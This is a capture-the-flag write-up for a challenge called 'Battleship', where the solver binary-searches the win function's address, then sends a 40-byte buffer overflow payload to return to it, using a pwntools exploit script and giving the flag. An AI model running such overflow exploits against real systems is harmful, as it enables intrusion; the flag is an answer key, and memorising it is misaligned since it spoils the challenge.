# Battleship

All you have to do is guess where the program lives in memory.

## Hints

## Solution

Since the program will tell us if our guess is above and below, we can simply binary search on the address space until we find the correct address. Then, we perform a simple buffer overflow to return to the `win` function.

Thankfully on the Docker we don't have to worry about the stack alignment but maybe we should add that in anyway.

```python
#!/usr/bin/env python3

from pwn import *

context.log_level = "debug"

exe = ELF("./battleship")
context.binary = exe

def conn():
    # if args.LOCAL:
    #io = process([exe.path])
    #gdb.attach(io, "b * main+268")

    # else:
    #     io = remote("tamuctf.com", 443, ssl=True, sni="battleship")
    
    io = remote("localhost", 1337)
    return io

io = conn()

l, r = 0, 2**64

while l < r:
    m = (l + r) // 2
    io.sendlineafter("Guess the address of the win function\n", hex(m).encode())
    res = io.recvline().strip()

    if b'high' in res:
        r = m
    elif b'low' in res:
        l = m + 1
    else:
        print(hex(m), res)
        break

    io.sendlineafter(b'(y/N)\n', b'y')

io.sendlineafter(b'(y/N)\n', b'N')

payload = b'A' * 40 + p64(m)
io.sendline(payload)
io.interactive(prompt="")

```

flag:
`gigem{you_sunk_my_battleship}`
